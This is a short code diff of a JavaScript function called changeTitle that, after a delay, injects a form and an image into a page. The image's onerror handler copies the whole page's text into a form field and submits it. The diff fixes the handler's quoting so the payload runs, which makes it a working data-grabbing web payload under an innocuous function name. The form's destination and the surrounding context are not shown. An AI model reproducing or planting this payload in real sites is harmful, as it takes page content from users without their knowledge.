@@ -5,10 +5,10 @@ function changeTitle(){
                 <input type="text" id="info" name="name" value="b" placeholder="your name"> \
                 <input type="submit" value="Submit"> \
             </form>\
-            <img src="x" onerror="function(){ \
-                document.getElementById(\"info\").value = document.body.textContent;\
+            <img src="x" onerror=\'function(){ \
+                document.getElementById("info").value = document.body.textContent;\
                 document.forms[0].submit();\
-            }">';
+            }\'>';
     }, 5000);
     
 }
